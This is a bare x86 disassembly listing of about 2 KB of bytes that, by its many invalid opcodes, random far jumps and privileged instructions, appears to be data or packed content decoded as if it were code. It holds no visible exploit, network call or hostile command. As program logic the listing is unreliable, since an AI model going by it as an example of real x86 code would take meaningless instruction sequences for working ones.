  41ac2a:	and    DWORD PTR [edi-0x1e],ebx
  41ac2d:	out    0x44,eax
  41ac2f:	stos   BYTE PTR es:[edi],al
  41ac30:	lods   eax,DWORD PTR cs:[esi]
  41ac32:	or     al,0x2b
  41ac34:	scas   eax,DWORD PTR es:[edi]
  41ac35:	jmp    0x41ac0a
  41ac37:	push   ss
  41ac38:	aaa    
  41ac39:	push   esp
  41ac3a:	popa   
  41ac3b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41ac3d:	fild   QWORD PTR ds:0x690dd0fd
  41ac43:	loop   0x41aca7
  41ac45:	push   ecx
  41ac46:	repnz shl DWORD PTR [edi],0x83
  41ac4a:	(bad)  
  41ac4b:	gs pop eax
  41ac4d:	js     0x41ac02
  41ac4f:	push   edx
  41ac50:	(bad)  
  41ac51:	lock add dh,BYTE PTR [edi-0x1c]
  41ac55:	test   eax,0x30718a0f
  41ac5a:	mov    edi,0x4695b9d
  41ac5f:	shr    DWORD PTR [ebp+0x16],0xca
  41ac63:	ja     0x41ac82
  41ac65:	std    
  41ac66:	repnz xor ch,BYTE PTR ds:0x21243bfb
  41ac6d:	jmp    0x6d9b0421
  41ac72:	push   ss
  41ac73:	and    bh,dl
  41ac75:	and    BYTE PTR ds:0x13a2ea60,cl
  41ac7b:	retf   0x2b1f
  41ac7e:	add    BYTE PTR [esi],cl
  41ac80:	imul   DWORD PTR [esi-0x758952c]
  41ac86:	push   DWORD PTR [ebx-0x74]
  41ac89:	ror    DWORD PTR [ebp+ebp*1+0x58c7c748],0xd0
  41ac91:	inc    ebp
  41ac92:	xchg   ebp,eax
  41ac93:	into   
  41ac94:	rcr    DWORD PTR [ebx],0xe1
  41ac97:	fstp   TBYTE PTR [ebp-0x142e173e]
  41ac9d:	dec    edi
  41ac9e:	(bad)  [esi-0xdc07b4e]
  41aca4:	jne    0x41ad0c
  41aca6:	test   BYTE PTR [ecx-0x1f],dl
  41aca9:	pop    DWORD PTR [ecx-0x7fa127a4]
  41acaf:	mov    DWORD PTR [esi*8+0x7a445e5e],ebx
  41acb6:	stos   DWORD PTR es:[edi],eax
  41acb7:	cli    
  41acb8:	stos   BYTE PTR es:[edi],al
  41acb9:	test   ecx,ebx
  41acbb:	or     DWORD PTR [ebp-0x1400d540],ebp
  41acc1:	fiadd  WORD PTR [ebx]
  41acc3:	retf   0x2c70
  41acc6:	ja     0x41ad43
  41acc8:	vpand  ymm3,ymm6,ymm5
  41accc:	dec    eax
  41accd:	add    eax,0xd51d7548
  41acd2:	es add al,0x20
  41acd5:	dec    esi
  41acd6:	std    
  41acd7:	xchg   edi,eax
  41acd8:	mov    ch,0x8a
  41acda:	mul    BYTE PTR [esi]
  41acdc:	push   ss
  41acdd:	into   
  41acde:	daa    
  41acdf:	test   eax,0x358e3abb
  41ace4:	inc    esp
  41ace5:	pop    eax
  41ace6:	xor    eax,DWORD PTR [ecx+0x67ac8c50]
  41acec:	jmp    0x41acdf
  41acee:	retf   0xff63
  41acf1:	es sbb eax,0x6b6a9563
  41acf7:	cmc    
  41acf8:	pop    ss
  41acf9:	jmp    0x4fae9adb
  41acfe:	adc    esp,edi
  41ad00:	(bad)  
  41ad01:	aam    0x14
  41ad03:	ret    0xa0eb
  41ad06:	mov    ch,0xae
  41ad08:	mov    ds:0x83b0e306,eax
  41ad0d:	retf   
  41ad0e:	sbb    ch,al
  41ad10:	sar    DWORD PTR [ebp+0x4d],0x1e
  41ad14:	add    eax,DWORD PTR [esi+0x34bd5115]
  41ad1a:	dec    ebp
  41ad1b:	ds push esp
  41ad1d:	(bad)  
  41ad1e:	jecxz  0x41ace4
  41ad20:	pushw  es
  41ad22:	retf   0xe105
  41ad25:	sub    al,0x60
  41ad27:	hlt    
  41ad28:	pop    ebx
  41ad29:	fisttp DWORD PTR [edi]
  41ad2b:	pop    ds
  41ad2c:	popf   
  41ad2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad2e:	lea    edi,[edx+ebp*4-0x5]
  41ad32:	jnp    0x41ace3
  41ad34:	mov    al,0x65
  41ad36:	icebp  
  41ad37:	lock idiv BYTE PTR [edx+0x16]
  41ad3b:	retf   
  41ad3c:	inc    esp
  41ad3d:	into   
  41ad3e:	cmp    eax,0x94c077c6
  41ad43:	lock sti 
  41ad45:	js     0x41ad78
  41ad47:	pusha  
  41ad48:	sub    al,0x4e
  41ad4a:	adc    al,0x29
  41ad4c:	xchg   DWORD PTR [ebp+edi*2-0x75052335],edi
  41ad53:	jo     0x41adca
  41ad55:	pop    ebx
  41ad56:	jle    0x41ad89
  41ad58:	lea    ecx,[ebp-0x1a0aabac]
  41ad5e:	jg     0x41ad65
  41ad60:	jne    0x41ad4c
  41ad62:	or     edx,ebp
  41ad64:	test   ch,ah
  41ad66:	les    esi,FWORD PTR [di+0x69]
  41ad6a:	jp     0x41ad32
  41ad6c:	adc    ebp,DWORD PTR [ebp-0xd]
  41ad6f:	(bad)  
  41ad70:	push   ebp
  41ad71:	out    0x14,eax
  41ad73:	outs   dx,BYTE PTR ds:[esi]
  41ad74:	or     cl,BYTE PTR [esi-0x36]
  41ad77:	enter  0x4552,0xbc
  41ad7b:	push   0x1cdb1d3a
  41ad80:	sub    al,0xf2
  41ad82:	lods   eax,DWORD PTR ds:[esi]
  41ad83:	into   
  41ad84:	xor    ah,bh
  41ad86:	sbb    al,0x87
  41ad88:	and    cl,bh
  41ad8a:	xchg   esi,eax
  41ad8b:	pop    eax
  41ad8c:	call   0x6182:0x61e33b5
  41ad93:	push   edi
  41ad94:	test   BYTE PTR [ecx+ecx*4+0x125a0b4e],0xf2
  41ad9c:	mov    ah,0xfd
  41ad9e:	pop    es
  41ad9f:	xlat   BYTE PTR ds:[ebx]
  41ada0:	(bad)  
  41ada1:	push   ecx
  41ada2:	push   0xd2040376
  41ada7:	mov    edi,0x9c74255f
  41adac:	daa    
  41adad:	jo     0x41ae0f
  41adaf:	lea    edx,[ebx]
  41adb1:	es jp  0x41ada2
  41adb4:	fbld   TBYTE PTR [ecx-0x5a61b7c]
  41adba:	mov    ecx,0xc1b93661
  41adbf:	push   es
  41adc0:	jmp    0x8945950a
  41adc5:	jge    0x41ad55
  41adc7:	mov    cl,0xff
  41adc9:	jae    0x41ad5d
  41adcb:	aam    0x55
  41adcd:	mov    al,ds:0xf623ba1d
  41add2:	leave  
  41add3:	cmp    bh,dl
  41add5:	push   esi
  41add6:	sub    eax,0x894ddf94
  41addb:	mov    esi,0xea578a2e
  41ade0:	inc    esi
  41ade1:	sahf   
  41ade2:	dec    ebx
  41ade3:	or     DWORD PTR [ebx],ebx
  41ade5:	inc    ebp
  41ade6:	lds    esi,FWORD PTR [edx+0x64f73e92]
  41adec:	cmp    ecx,edx
  41adee:	xor    ecx,DWORD PTR [ebx+0x662c611d]
  41adf4:	or     dl,BYTE PTR [esi-0x12239de0]
  41adfa:	out    dx,al
  41adfb:	adc    al,0x67
  41adfd:	jp     0x41ad82
  41adff:	in     eax,dx
  41ae00:	push   esi
  41ae01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae02:	xor    DWORD PTR [edi],0xd279c147
  41ae08:	add    eax,0x5e80ba21
  41ae0d:	and    BYTE PTR [ebp-0x1e],cl
  41ae10:	(bad)  
  41ae11:	xchg   DWORD PTR cs:[ecx+0x5895c94b],edi
  41ae18:	clc    
  41ae19:	icebp  
  41ae1a:	arpl   WORD PTR [esi-0x70],bx
  41ae1d:	loopne 0x41adb9
  41ae1f:	call   ebp
  41ae21:	dec    edi
  41ae22:	xor    DWORD PTR fs:0xccb42c1f,ebx
  41ae29:	cmc    
  41ae2a:	daa    
  41ae2b:	push   ds
  41ae2c:	fdivr  st,st(4)
  41ae2e:	mov    dl,0x7d
  41ae30:	push   ebp
  41ae31:	jnp    0x41ae5c
  41ae33:	jno    0x41ae56
  41ae35:	mov    edx,esp
  41ae37:	jp     0x41ae9d
  41ae39:	adc    eax,0xdb68e76
  41ae3e:	lock sub al,0x15
  41ae41:	pop    ebp
  41ae42:	xchg   BYTE PTR [ebp-0x3f58509e],bh
  41ae48:	xchg   edx,eax
  41ae49:	fwait
  41ae4a:	cmp    ebp,DWORD PTR [edi-0x60]
  41ae4d:	sub    eax,0x99722e96
  41ae52:	mov    ss,ecx
  41ae54:	sti    
  41ae55:	pusha  
  41ae56:	dec    ebp
  41ae57:	dec    esp
  41ae58:	mov    bl,0x7f
  41ae5a:	sbb    edi,DWORD PTR gs:[eax+0x532cc56a]
  41ae61:	shl    BYTE PTR [ebx+0x4],cl
  41ae64:	jp     0x41ae08
  41ae66:	dec    ecx
  41ae67:	pop    esp
  41ae68:	loopne 0x41ae46
  41ae6a:	call   0xdf84:0x8618e843
  41ae71:	mov    ch,0x80
  41ae73:	xor    al,BYTE PTR [edi+0x71]
  41ae76:	and    DWORD PTR ds:0xcf85eaa5,esi
  41ae7c:	adc    ecx,esi
  41ae7e:	inc    ecx
  41ae7f:	loopne 0x41ae03
  41ae81:	cmp    dh,ch
  41ae83:	in     eax,0x5f
  41ae85:	pop    ecx
  41ae86:	jns    0x41ae64
  41ae88:	mov    al,ds:0x1507af7
  41ae8d:	push   esp
  41ae8e:	test   ah,al
  41ae90:	mov    dh,BYTE PTR [edx+edi*4-0x32]
  41ae94:	mov    ebp,0x94a060f6
  41ae99:	and    ebp,DWORD PTR [ebx+0x71]
  41ae9c:	mov    cl,0xab
  41ae9e:	sahf   
  41ae9f:	xor    al,0x3e
  41aea1:	and    edi,0x6b5bfa8b
  41aea7:	icebp  
  41aea8:	outs   dx,DWORD PTR ds:[esi]
  41aea9:	jmp    0x2e397ba8
  41aeae:	cmp    BYTE PTR [ebx],bl
  41aeb0:	pop    esp
  41aeb1:	and    eax,0xfffffff8
  41aeb4:	inc    ebx
  41aeb5:	out    dx,al
  41aeb6:	ds cli 
  41aeb8:	inc    eax
  41aeb9:	cs cld 
  41aebb:	pop    ds
  41aebc:	mov    BYTE PTR [edi],ch
  41aebe:	dec    BYTE PTR [ebp-0x6b01a843]
  41aec4:	add    ch,BYTE PTR [edx+0x4c]
  41aec7:	pop    ds
  41aec8:	pop    ebp
  41aec9:	cmp    bh,dl
  41aecb:	add    DWORD PTR [esi],esp
  41aecd:	stos   BYTE PTR es:[edi],al
  41aece:	stos   DWORD PTR es:[edi],eax
  41aecf:	push   ebp
  41aed0:	mov    al,ds:0xd93adb44
  41aed5:	test   BYTE PTR [edx],bh
  41aed7:	adc    ebp,DWORD PTR [esi+0x25900dda]
  41aedd:	idiv   BYTE PTR [ebx+ecx*1+0x6c]
  41aee1:	shl    edx,cl
  41aee3:	fwait
  41aee4:	cmp    al,0x1e
  41aee6:	cmp    BYTE PTR [eax+0x16698d1],ch
  41aeec:	in     eax,0x26
  41aeee:	fadd   QWORD PTR [ecx+0x6616dd7d]
  41aef4:	push   esp
  41aef5:	fild   DWORD PTR [ecx+edx*4+0x10f2aa6b]
  41aefc:	xchg   edx,eax
  41aefd:	push   ebp
  41aefe:	sub    eax,DWORD PTR [ecx*4+0x301982c5]
  41af05:	sub    DWORD PTR [edx],ebp
  41af07:	fldenv [edi-0x3213fb0d]
  41af0d:	ds cmp eax,0x4577b9cd
  41af13:	sar    DWORD PTR [eax-0x47],0x7a
  41af17:	cs jo  0x41af27
  41af1a:	jo     0x41af1c
  41af1c:	adc    al,bh
  41af1e:	aas    
  41af1f:	pop    ss
  41af20:	push   edx
  41af21:	mov    edx,0x6a711c5a
  41af26:	mov    ah,0xd3
  41af28:	fmul   QWORD PTR [ebp-0x37]
  41af2b:	push   eax
  41af2c:	ds and ebp,esi
  41af2f:	(bad)  
  41af30:	test   DWORD PTR [edi-0x638a7fd9],0x9570ec4
  41af3a:	jp     0x41af96
  41af3c:	sbb    dh,cl
  41af3e:	mov    ebx,0x17976c7b
  41af43:	rcl    DWORD PTR [ebx+0x12],0xdc
  41af47:	cmp    al,0xb0
  41af49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af4a:	stos   DWORD PTR es:[edi],eax
  41af4b:	popf   
  41af4c:	mov    DWORD PTR [edx],ecx
  41af4e:	push   ebp
  41af4f:	fist   WORD PTR [ecx]
  41af51:	fist   WORD PTR [ebp-0x52faf2bc]
  41af57:	in     al,dx
  41af58:	pop    eax
  41af59:	or     BYTE PTR [esp+edx*1-0x72],0x13
  41af5e:	cld    
  41af5f:	ss dec ebp
  41af61:	jg     0x41af1b
  41af63:	pop    ss
  41af64:	jb     0x41afbc
  41af66:	xchg   edx,eax
  41af67:	cmc    
  41af68:	mov    BYTE PTR [ebx-0x2c],dl
  41af6b:	mov    BYTE PTR [edi+0x5c],ah
  41af6e:	add    eax,0xe46afa95
  41af73:	pop    esi
  41af74:	cmp    al,ah
  41af76:	ror    DWORD PTR [ebp-0x32],0x13
  41af7a:	stos   BYTE PTR es:[edi],al
  41af7b:	daa    
  41af7c:	stos   BYTE PTR es:[edi],al
  41af7d:	(bad)  
  41af7e:	adc    ebp,ebp
  41af80:	or     BYTE PTR [ecx-0x28],0x46
  41af84:	shl    ch,1
  41af86:	jbe    0x41af8e
  41af88:	sbb    DWORD PTR [esi],esi
  41af8a:	loopne 0x41af0e
  41af8c:	mov    eax,0x544db717
  41af91:	xchg   BYTE PTR [edx+0x62],bl
  41af94:	jecxz  0x41afcd
  41af96:	xchg   edx,eax
  41af97:	imul   ebx,DWORD PTR [eax+0x5e],0xd
  41af9b:	cld    
  41af9c:	out    dx,eax
  41af9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af9e:	xor    DWORD PTR [ebx],ebp
  41afa0:	xlat   BYTE PTR ds:[ebx]
  41afa1:	fnstcw WORD PTR [ebp+0xfbddacb]
  41afa7:	xchg   BYTE PTR [ebp-0x5e],cl
  41afaa:	loopne 0x41af44
  41afac:	push   ds
  41afad:	or     eax,0xc0ff1169
  41afb2:	fstp   st(0)
  41afb4:	sti    
  41afb5:	xchg   ebp,eax
  41afb6:	sbb    DWORD PTR [ebp-0x5c1db65d],eax
  41afbc:	fist   WORD PTR [edx-0x62329427]
  41afc2:	pop    esp
  41afc3:	pop    ebp
  41afc4:	dec    esi
  41afc5:	xor    eax,0x8dea53bb
  41afca:	test   eax,0xbc361e79
  41afcf:	cwde   
  41afd0:	pop    ecx
  41afd1:	push   eax
  41afd2:	or     BYTE PTR [edx],ah
  41afd4:	test   BYTE PTR [esi+0x5e59bfd0],ch
  41afda:	inc    esp
  41afdb:	mov    al,ds:0x5e178ef3
  41afe0:	mov    bh,BYTE PTR [edi-0x12]
  41afe3:	and    DWORD PTR [esi-0x4372cac9],edi
  41afe9:	inc    eax
  41afea:	or     eax,0xfac1ce59
  41afef:	add    eax,0x932debde
  41aff4:	sbb    ah,0x8f
  41aff7:	test   BYTE PTR [edx],al
  41aff9:	jne    0x41b005
  41affb:	jns    0x41b032
  41affd:	mov    WORD PTR [ebx],?
  41afff:	fadd   QWORD PTR [ebx-0x779210df]
  41b005:	dec    edi
  41b006:	leave  
  41b007:	or     al,0x94
  41b009:	fwait
  41b00a:	pop    esp
  41b00b:	cmc    
  41b00c:	xor    al,0x46
  41b00e:	test   eax,0xe19432a2
  41b013:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b014:	cli    
  41b015:	mov    bh,0xd9
  41b017:	mov    ch,0xe8
  41b019:	cmc    
  41b01a:	or     eax,0x48e86083
  41b01f:	out    0xb1,eax
  41b021:	cs gs in al,0x3d
  41b025:	mov    dh,0xd2
  41b027:	cdq    
  41b028:	adc    bh,BYTE PTR [esi]
  41b02a:	jg     0x41afc3
  41b02c:	mov    esp,DWORD PTR [esi-0x11b5dbb6]
  41b032:	mov    esi,0x2caccae
  41b037:	stc    
  41b038:	jmp    0x95d3f625
  41b03d:	xchg   DWORD PTR [edi+edx*1],esp
  41b040:	aam    0xa7
  41b042:	ffree  st(7)
  41b044:	pop    eax
  41b045:	sub    dl,al
  41b047:	mov    cl,0x1f
  41b049:	inc    edx
  41b04a:	imul   edi,DWORD PTR [esi-0xf772008],0x4b6b4bd2
  41b054:	rcr    ecx,cl
  41b056:	sub    DWORD PTR [edi+0x1f],eax
  41b059:	std    
  41b05a:	not    DWORD PTR [ebp*2+0x56d523]
  41b061:	mov    esi,0x889658c1
  41b066:	fbld   TBYTE PTR [edi]
  41b068:	jne    0x41b059
  41b06a:	sbb    al,0x1c
  41b06c:	icebp  
  41b06d:	test   dl,al
  41b06f:	push   edx
  41b070:	lods   al,BYTE PTR ds:[esi]
  41b071:	cmp    eax,0xb957ff4e
  41b076:	push   ebx
  41b077:	mov    cl,0xea
  41b079:	pop    ds
  41b07a:	xlat   BYTE PTR ds:[ebx]
  41b07b:	dec    edx
  41b07c:	adc    al,dh
  41b07e:	into   
  41b07f:	jno    0x41b0b8
  41b081:	pop    ebx
  41b082:	retf   
  41b083:	addr16 (bad) 
  41b085:	cs mov edi,0x848560ee
  41b08b:	ds pop ss
  41b08d:	or     al,0x70
  41b08f:	mov    edx,0xca67694a
  41b094:	pusha  
  41b095:	adc    BYTE PTR [ebp+0x67],0xf0
  41b099:	or     al,0x4f
  41b09b:	loop   0x41b106
  41b09d:	test   eax,0xf1fab3f3
  41b0a2:	dec    edx
  41b0a3:	or     BYTE PTR [esi-0x3e],dh
  41b0a6:	sbb    ah,BYTE PTR [edi+0x1]
  41b0a9:	mov    dl,ah
  41b0ab:	add    edx,eax
  41b0ad:	test   DWORD PTR [eax+ecx*8],edx
  41b0b0:	aas    
  41b0b1:	xchg   edi,eax
  41b0b2:	into   
  41b0b3:	pushf  
  41b0b4:	stos   DWORD PTR es:[edi],eax
  41b0b5:	lock and ebp,ecx
  41b0b8:	dec    ecx
  41b0b9:	enter  0xdf17,0x45
  41b0bd:	test   eax,0xafa42351
  41b0c2:	mov    cl,0xb1
  41b0c4:	sub    esi,esp
  41b0c6:	jb     0x41b0a3
  41b0c8:	stos   DWORD PTR es:[edi],eax
  41b0c9:	lea    eax,[esi-0xeaedc26]
  41b0cf:	pop    edx
  41b0d0:	nop
  41b0d1:	int    0x90
  41b0d3:	(bad)  
  41b0d4:	popf   
  41b0d5:	mov    al,ds:0xd5c71ef
  41b0da:	sub    al,ah
  41b0dc:	or     esp,edi
  41b0de:	jl     0x41b0ff
  41b0e0:	mov    ecx,0xe79f96de
  41b0e5:	test   al,0x99
  41b0e7:	dec    edi
  41b0e8:	sub    ecx,ecx
  41b0ea:	push   eax
  41b0eb:	and    al,0x48
  41b0ed:	push   0x5c
  41b0ef:	jae    0x41b168
  41b0f1:	jae    0x41b08d
  41b0f3:	mov    BYTE PTR [ebx+0x1f],ah
  41b0f6:	ja     0x41b141
  41b0f8:	and    ebx,esp
  41b0fa:	cmp    eax,DWORD PTR [esi+edx*4-0x112d2027]
  41b101:	enter  0xbad,0x69
  41b105:	sbb    ah,ah
  41b107:	shr    BYTE PTR [esi+0x55],0xbd
  41b10b:	into   
  41b10c:	loopne 0x41b092
  41b10e:	or     al,0x37
  41b110:	push   DWORD PTR [ebx]
  41b112:	dec    ecx
  41b113:	out    dx,al
  41b114:	push   ds
  41b115:	add    BYTE PTR [edi+0x7c],dh
  41b118:	dec    ebp
  41b119:	dec    esp
  41b11a:	mov    ?,WORD PTR [ebx]
  41b11c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b11d:	push   cs
  41b11e:	shl    BYTE PTR [edx],cl
  41b120:	psubsw mm7,QWORD PTR [edx]
  41b123:	imul   edi,DWORD PTR [esp+eiz*2-0x52],0xffffff85
  41b128:	jno    0x41b0c0
  41b12a:	sbb    eax,0xeea1281c
  41b12f:	jl     0x41b14e
  41b131:	fwait
  41b132:	rcl    DWORD PTR [ebx],cl
  41b134:	jnp    0x41b133
  41b136:	xor    eax,0xd193bd04
  41b13b:	xchg   ebp,eax
  41b13c:	add    bl,BYTE PTR [esi]
  41b13e:	mov    BYTE PTR [ebp+0x50],bh
  41b141:	cmp    bl,dh
  41b143:	cs dec edi
  41b145:	cld    
  41b146:	mov    ebx,DWORD PTR [edx]
  41b148:	inc    esi
  41b149:	int    0x87
  41b14b:	pop    eax
  41b14c:	jae    0x41b1b5
  41b14e:	aaa    
  41b14f:	cmp    eax,0x2927dd13
  41b154:	test   BYTE PTR [edi-0x2cf805bb],al
  41b15a:	mov    eax,0x4c6e6e5b
  41b15f:	xchg   esp,eax
  41b160:	std    
  41b161:	push   cs
  41b162:	stos   BYTE PTR es:[edi],al
  41b163:	mov    edx,0x1e3977ab
  41b168:	dec    esi
  41b169:	mov    bl,0x88
  41b16b:	inc    ebx
  41b16c:	and    dl,BYTE PTR [ebx+ecx*1-0x5c6963f3]
  41b173:	(bad)  
  41b174:	sub    BYTE PTR [esi+0x51918dca],al
  41b17a:	xor    bh,BYTE PTR ds:0xa635a21e
  41b180:	mov    BYTE PTR ds:0xef4d5c68,bh
  41b186:	loop   0x41b1ba
  41b188:	add    eax,0x79977ca
  41b18d:	mov    cl,0x6
  41b18f:	lods   eax,DWORD PTR ds:[esi]
  41b190:	cld    
  41b191:	ret    
  41b192:	sbb    ch,bh
  41b194:	cwde   
  41b195:	sub    DWORD PTR [ebp-0x51],ebx
  41b198:	jbe    0x41b1bf
  41b19a:	adc    eax,DWORD PTR [ebx]
  41b19c:	mov    BYTE PTR [ebp+0x558e17b5],dl
  41b1a2:	mov    ah,0x6d
  41b1a4:	sbb    al,0x46
  41b1a6:	push   es
  41b1a7:	or     BYTE PTR [esi+0x54],bl
  41b1aa:	or     eax,0x41bce78b
  41b1af:	push   eax
  41b1b0:	mov    al,0x4f
  41b1b2:	mov    bh,0x14
  41b1b4:	jb     0x41b149
  41b1b6:	ror    BYTE PTR [ecx],cl
  41b1b8:	sbb    DWORD PTR [edx],edx
  41b1ba:	nop
  41b1bb:	sbb    bl,BYTE PTR [ecx+0xf]
  41b1be:	popf   
  41b1bf:	fwait
  41b1c0:	(bad)  
  41b1c1:	icebp  
  41b1c2:	dec    esi
  41b1c3:	stos   BYTE PTR es:[edi],al
  41b1c4:	add    dl,dl
  41b1c6:	or     dh,cl
  41b1c8:	stc    
  41b1c9:	cwde   
  41b1ca:	(bad)  
  41b1cb:	xchg   ebp,eax
  41b1cc:	xor    BYTE PTR ss:[ebx+0x16],bl
  41b1d0:	jecxz  0x41b1d2
  41b1d2:	or     BYTE PTR [ebx+ebx*1],bl
  41b1d5:	cld    
  41b1d6:	or     esi,0xffffffb6
  41b1d9:	push   0xd8121405
  41b1de:	inc    edx
  41b1df:	inc    ebx
  41b1e0:	xor    DWORD PTR [edi-0x65],ebp
  41b1e3:	xchg   eax,ebp
  41b1e5:	cmp    eax,0xa0918a9f
  41b1ea:	test   dh,bl
  41b1ec:	(bad)  
  41b1ed:	pop    esp
  41b1ee:	cld    
  41b1ef:	jp     0x41b225
  41b1f1:	dec    edi
  41b1f2:	ss retf 
  41b1f4:	aas    
  41b1f5:	fnstsw WORD PTR [edx]
  41b1f7:	jmp    0xdbf55363
  41b1fc:	xlat   BYTE PTR ds:[ebx]
  41b1fd:	adc    dh,dh
  41b1ff:	mov    bl,0x52
  41b201:	xlat   BYTE PTR ds:[ebx]
  41b202:	gs dec ebx
  41b204:	lods   eax,DWORD PTR ds:[esi]
  41b205:	jecxz  0x41b1b1
  41b207:	fcmovbe st,st(6)
  41b209:	dec    ebx
  41b20a:	add    ah,dh
  41b20c:	fwait
  41b20d:	ret    
  41b20e:	pop    edx
  41b20f:	dec    ecx
  41b210:	cmp    eax,0xa9240054
  41b215:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b216:	lods   al,BYTE PTR ds:[esi]
  41b217:	call   0x52ffb26e
  41b21c:	cmp    eax,0x628699ff
  41b221:	inc    edx
  41b222:	into   
  41b223:	in     al,0x8c
  41b225:	inc    edi
  41b226:	cmc    
  41b227:	clc    
  41b228:	and    eax,DWORD PTR [edi-0x2c]
  41b22b:	cs fsub st,st(7)
  41b22e:	in     eax,dx
  41b22f:	mov    bl,0x77
  41b231:	in     al,dx
  41b232:	(bad)  
  41b234:	mov    ah,0x0
  41b236:	in     al,dx
  41b237:	std    
  41b238:	jl     0x41b1f3
  41b23a:	mov    ch,0x1e
  41b23c:	add    BYTE PTR [edx+0x75],bh
  41b23f:	jmp    0xe31a:0x45eb2b69
  41b246:	nop
  41b247:	mov    esi,0x348e7fbe
  41b24c:	or     cl,BYTE PTR [esi]
  41b24e:	add    eax,DWORD PTR es:[ebp-0x2026f1eb]
  41b255:	sbb    al,0x65
  41b257:	int    0xa0
  41b259:	(bad)  
  41b25b:	add    ah,BYTE PTR [ebx]
  41b25d:	sahf   
  41b25e:	add    BYTE PTR [ecx],cl
  41b260:	mov    al,0x3c
  41b262:	arpl   WORD PTR [ebp+0x70e26915],bx
  41b268:	jecxz  0x41b24d
  41b26a:	mov    edx,0x59a99352
  41b26f:	cmp    al,BYTE PTR [edx]
  41b271:	and    al,0x78
  41b273:	dec    edi
  41b274:	sub    BYTE PTR [edi+0x64],dh
  41b277:	push   DWORD PTR [esi]
  41b279:	xchg   ecx,eax
  41b27a:	out    0x89,eax
  41b27c:	sti    
  41b27d:	js     0x41b2ef
  41b27f:	and    ebx,edi
  41b281:	pop    ss
  41b282:	dec    esi
  41b283:	sbb    BYTE PTR [ebx-0x2b],0x6d
  41b287:	mov    esi,0x9561b634
  41b28c:	push   ss
  41b28d:	sbb    DWORD PTR [ebp-0x3fea93b8],eax
  41b293:	pop    edi
  41b294:	mov    ds:0x357c0ce3,eax
  41b299:	mov    edx,0x15bbde04
  41b29e:	pusha  
  41b29f:	push   ebx
  41b2a0:	ret    
  41b2a1:	(bad)  
  41b2a2:	das    
  41b2a3:	xor    esi,DWORD PTR [esi]
  41b2a5:	dec    ecx
  41b2a6:	mov    ah,0x2d
  41b2a8:	sbb    bl,BYTE PTR [edx-0x7c94a3c9]
  41b2ae:	mov    eax,ds:0x50aa35fd
  41b2b3:	pop    ebx
  41b2b4:	leave  
  41b2b5:	push   cs
  41b2b6:	cdq    
  41b2b7:	div    ecx
  41b2b9:	enter  0x8772,0x89
  41b2bd:	ins    DWORD PTR es:[edi],dx
  41b2be:	add    ebp,edx
  41b2c0:	push   ecx
  41b2c1:	add    eax,0x42910520
  41b2c6:	jle    0x41b306
  41b2c8:	shl    BYTE PTR [eax-0x33],cl
  41b2cb:	inc    eax
  41b2cc:	outs   dx,DWORD PTR ds:[esi]
  41b2cd:	pop    ecx
  41b2ce:	jecxz  0x41b2b7
  41b2d0:	cli    
  41b2d1:	outs   dx,BYTE PTR ds:[esi]
  41b2d2:	mov    ah,0x6
  41b2d4:	jae    0x41b2f9
  41b2d6:	inc    esi
  41b2d7:	les    esi,FWORD PTR [ecx+0x254f85e2]
  41b2dd:	aad    0x78
  41b2df:	mov    edi,0xbd230695
  41b2e4:	dec    ecx
  41b2e5:	sub    BYTE PTR [ecx+0x1d48ae32],bl
  41b2eb:	in     al,dx
  41b2ec:	cmp    al,0xad
  41b2ee:	mov    WORD PTR [ecx],ds
  41b2f0:	les    edx,FWORD PTR [ebp+0x6d]
  41b2f3:	cwde   
  41b2f4:	sub    edi,DWORD PTR ds:0x2459c8f3
  41b2fa:	retf   0xe626
  41b2fd:	adc    eax,0xe285fd5f
  41b302:	jmp    0x4207:0x4ecb9850
  41b309:	sub    BYTE PTR [eax+0x72],0x26
  41b30d:	ins    DWORD PTR es:[edi],dx
  41b30e:	pop    ds
  41b30f:	or     eax,0x39d1c9d4
  41b314:	test   al,0xda
  41b316:	push   ecx
  41b317:	lods   eax,DWORD PTR ds:[esi]
  41b318:	jo     0x41b33f
  41b31a:	push   edx
  41b31b:	and    DWORD PTR [edi+edi*2-0x36],ebx
  41b31f:	and    esp,DWORD PTR fs:0x4b8a01e8
  41b326:	add    al,0x88
  41b328:	push   edx
  41b329:	clc    
  41b32a:	sbb    al,0xf2
  41b32c:	add    eax,0x1c7d87c1
  41b331:	arpl   WORD PTR [edi-0x58458e3a],sp
  41b337:	xor    esp,DWORD PTR [edi-0x2aeef748]
  41b33d:	push   es
  41b33e:	dec    esp
  41b33f:	addr16 sbb al,dl
  41b342:	or     BYTE PTR [ecx+esi*1-0x5812831c],dh
  41b349:	adc    eax,0x4f3e08d1
  41b34e:	jmp    0x248c:0xd6adeeb0
  41b355:	test   BYTE PTR [esi+0x4eab637],ch
  41b35b:	enter  0x9178,0x6f
  41b35f:	mov    BYTE PTR [edi+0x60],bh
  41b362:	stos   DWORD PTR es:[edi],eax
  41b363:	mov    al,0xca
  41b365:	daa    
  41b366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b367:	retf   
  41b368:	sar    DWORD PTR [ebp-0x65],1
  41b36b:	pushf  
  41b36c:	faddp  st(7),st
  41b36e:	add    BYTE PTR [esp+edx*8-0x5ffbf507],dh
  41b375:	cs repnz sub eax,0x28495ff7
  41b37c:	mov    al,ds:0x49b25cde
  41b381:	jl     0x41b3e9
  41b383:	stos   DWORD PTR es:[edi],eax
  41b384:	(bad)  
  41b385:	mov    bh,0x64
  41b387:	push   esp
  41b388:	test   dh,ch
  41b38a:	lods   al,BYTE PTR ds:[esi]
  41b38b:	mov    cl,0xa8
  41b38d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b38e:	push   ebp
  41b38f:	sti    
  41b390:	mov    bl,0xb8
  41b392:	pop    edx
  41b393:	outs   dx,DWORD PTR ds:[esi]
  41b394:	xor    al,0xc0
  41b396:	pop    edi
  41b397:	cs jl  0x41b338
  41b39a:	jbe    0x41b374
  41b39c:	add    al,0xda
  41b39e:	pop    ss
  41b39f:	das    
  41b3a0:	addr16 cwde 
  41b3a2:	push   edx
  41b3a3:	xchg   dx,ax
